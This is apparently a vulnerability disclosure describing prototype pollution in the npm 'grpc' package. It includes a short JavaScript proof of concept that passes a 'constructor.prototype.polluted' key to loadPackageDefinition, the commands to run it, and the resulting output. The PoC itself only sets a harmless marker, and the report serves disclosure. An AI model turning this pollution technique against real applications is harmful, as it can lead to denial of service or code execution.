# Description

`grpc` native core package is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var grpc =require('grpc')
grpc.loadPackageDefinition({'constructor.prototype.polluted': "Yes! Its Polluted"});
console.log({}.polluted)
```

2. Execute the following commands in another terminal:

```bash
npm i grpc # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
[Function: ServiceClient] { service: 'Yes! Its Polluted' }
```
